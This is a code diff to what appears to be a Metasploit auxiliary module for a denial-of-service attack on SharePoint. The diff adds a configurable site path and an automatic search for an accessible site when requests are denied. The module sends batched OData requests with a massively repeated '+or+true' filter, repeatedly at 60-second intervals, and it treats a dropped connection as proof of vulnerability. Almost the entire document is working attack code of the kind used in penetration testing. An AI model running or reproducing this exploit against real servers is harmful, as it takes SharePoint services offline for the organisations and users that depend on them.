@@ -46,6 +46,7 @@ class MetasploitModule < Msf::Auxiliary
             OptString.new('SSL',  [true, 'Negotiate SSL/TLS for outgoing connections', true]),
             OptString.new('USERNAME',  [false, 'The username to login with']),
             OptString.new('PASSWORD',  [false, 'The password to login with']),
+            OptString.new('SITES',  [false, 'Accessible URL site']),
             OptString.new('VHOST',  [true, 'HTTP server virtual host'])
         ])
   end
@@ -64,6 +65,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def extract_digest_value(cookie)
     token_api_uri = '/_api/contextinfo'
+    unless datastore['SITES'].nil?
+      token_api_uri = datastore['SITES'] + token_api_uri
+    end
+
     res = send_request_cgi( {
                                 'method' => 'POST',
                                 'uri' => normalize_uri(token_api_uri),
@@ -97,26 +102,31 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def send_request(reps)
-    vuln_api_uri = "/_api/$batch"
+    api_uri="/_api"
+    unless datastore['SITES'].nil?
+      api_uri = datastore['SITES'] + api_uri
+    end
+    print_status("Request URI - " + api_uri)
+
     cookie = datastore['COOKIE']
     data = Rex::MIME::Message.new
     data.add_part(
-        "GET /_api/web/lists?$filter=true" + "+or+true" * reps + " HTTP/1.1\r\n" +
+        "GET "+ api_uri + "/web/lists?$filter=true" + "+or+true" * reps + " HTTP/1.1\r\n" +
             "accept: application/json;odata.metadata=minimal\r\n", #Data is our payload
         'application/http',                                       #Content Type
         'binary',                                                 #Transfer Encoding
         nil                                                       #Content Disposition
     )
+
     send_request_cgi({
                          'method'   => 'POST',
-                         'uri'      => normalize_uri(vuln_api_uri),
+                         'uri'      => normalize_uri(api_uri + "/$batch"),
                          'ctype'  => "multipart/mixed; boundary=#{data.bound}",
                          'data'   => data.to_s,
                          'cookie' => cookie,
                          'headers'      => {
                              'x-requestdigest'	=> extract_digest_value(cookie),
                          }
-
                      })
   end
 
@@ -127,14 +137,36 @@ class MetasploitModule < Msf::Auxiliary
       send_dos_request
       sleep(60)
     }
+  end
 
+  def get_available_site
+    print_status("Searching for available site")
+    cookie = datastore['COOKIE']
+    search_uri = "/search/_api/search/query"
+    res = send_request_cgi({
+                         'method'   => 'GET',
+                         'uri'      => normalize_uri(search_uri),
+                         'cookie' => cookie,
+                         'vars_get' => {
+                             'QueryText' => "'ContentClass:STS_Site'",
+                             'SelectProperties' => "'SiteName'",
+                             'StartRow' => 0,
+                             'RowLimit' => 1,
+                         }
+                     })
+    begin
+      return res.get_xml_document.xpath("//d:Cells/d:element[d:Key='SiteName']/d:Value").text
+    rescue
+      print_error("Could not found any available site")
+      return nil
+    end
   end
 
   def check
     print_status("Checking SharePoint version")
     unless check_sp_version
-      print("a")
-      return
+      print_error("Unsupported SharePoint version")
+      return Exploit::CheckCode::Safe
     end
 
     if datastore['USERNAME'].present? and datastore['PASSWORD'].present?
@@ -152,12 +184,30 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_status("Sending malicious request...")
-    res = send_dos_request
+    begin
+      res = send_dos_request
+    rescue Errno::ECONNRESET
+      res = nil
+    end
 
     if res.nil?
       Exploit::CheckCode::Vulnerable
     else
       print_bad("Server response " + res.code.to_s + " to malicious request")
+      if res.body.to_s.include? "Access denied." and not datastore['SITES'].present?
+        print_status("Request returned access denied")
+        site_url = get_available_site
+        unless site_url.present?
+          return Exploit::CheckCode::Safe
+        end
+        print_status("Sites uri updated - " + site_url[/\/sites.*/])
+        datastore['SITES'] = site_url[/\/sites.*/]
+        res = send_dos_request
+        if res.nil?
+          return Exploit::CheckCode::Vulnerable
+        end
+      end
+
       Exploit::CheckCode::Safe
     end
   end
